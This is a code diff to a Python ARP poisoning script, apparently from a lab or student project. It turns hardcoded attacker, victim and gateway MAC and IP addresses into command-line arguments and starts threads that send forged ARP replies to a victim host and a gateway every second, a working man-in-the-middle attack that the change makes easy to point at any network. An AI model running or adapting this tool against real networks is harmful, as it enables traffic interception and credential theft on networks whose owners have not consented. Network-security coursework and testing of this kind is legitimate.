@@ -4,6 +4,8 @@ import socket
 import struct
 import time
 import threading
+import argparse
+import binascii
 
 
 def arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip):
@@ -57,31 +59,27 @@ def send_to_gateway(src_mac,fake_src_ip,des_mac,des_ip):
     while 1:
         send_arp(src_mac,fake_src_ip,des_mac,des_ip)
         time.sleep(1)
-
-#Local MAC address        
-src_mac=b'\x00\x0C\x29\x7F\x05\x7D'  #input("MAC address ATTACKER (ex 00:0C:29:7F:05:7D): ") # \x00\x0C\x29\x7F\x05\x7D (Kali Linux)
-
-#Forged sender IP address
-fake_src_gateway_ip='20.20.20.21' #destination IP address gateway == Ubuntu_DNMinh
-fake_src_ubuntu_ip='20.20.20.24'
-
-
-des_mac_u=b'\x00\x0C\x29\xEA\x26\x44'  #input("MAC address VICTIM (ex 00:0c:29:ea:26:44): ") # \x00\x0C\x29\xEA\x26\x44 (Ubuntu Victim)
-# des_ip_u='20.20.20.24' #destination IP address = Ubuntu_Victim
-
-
-des_mac_g=b'\x00\x0C\x29\x1E\xC1\x27'  #input("MAC address GATEWAY (ex 00:0C:29:1E:C1:27): ") # \xD8\xF2\xCA\xB5\x33\x4E (Ubuntu)
-# des_ip_g='20.20.20.21' #destination IP address gateway == Ubuntu_DNMinh
-
+"""
+========================================================================================================================================================
+"""
+def UserInput():
+    #Cài đặt tham số khi dùng trên terminal
+    parser = argparse.ArgumentParser("MTA TOOL: ARP POISONING ATTACK")
+    parser.add_argument("-aM", "--macattacker", help="Specify the Attacker's MAC address", required=False)
+    parser.add_argument("-vM", "--macvictim", help="Specify the Victim's MAC address", required=False)
+    parser.add_argument("-gM", "--macgateway", help="Specify Gateway's MAC Address", required=False)
+    parser.add_argument("-vI", "--ipvictim", help="Specify the Victim's IP address", required=False)
+    parser.add_argument("-gI", "--ipgateway", help="Specify the Gateway's IP address", required=False)
+    args = parser.parse_args()
+    return binascii.unhexlify(args.macattacker.replace(':', '')), binascii.unhexlify(args.macvictim.replace(':', '')), binascii.unhexlify(args.macgateway.replace(':', '')), args.ipvictim, args.ipgateway
+src_mac, des_mac_u, des_mac_g, fake_src_ubuntu_ip, fake_src_gateway_ip = UserInput()
 
 # Start the thread sent to Ubuntu_Victim
-# thread = threading.Thread(target=send_to_ubuntu, args=(src_mac,fake_src_gateway_ip,des_mac_u,des_ip_u))
 thread = threading.Thread(target=send_to_ubuntu, args=(src_mac,fake_src_gateway_ip,des_mac_u,fake_src_ubuntu_ip))
 thread.start()
 
 time.sleep(0.1)
 
 # Start sending to the gateway thread
-# thread = threading.Thread(target=send_to_gateway, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,des_ip_g))
 thread = threading.Thread(target=send_to_gateway, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,fake_src_gateway_ip))
 thread.start()
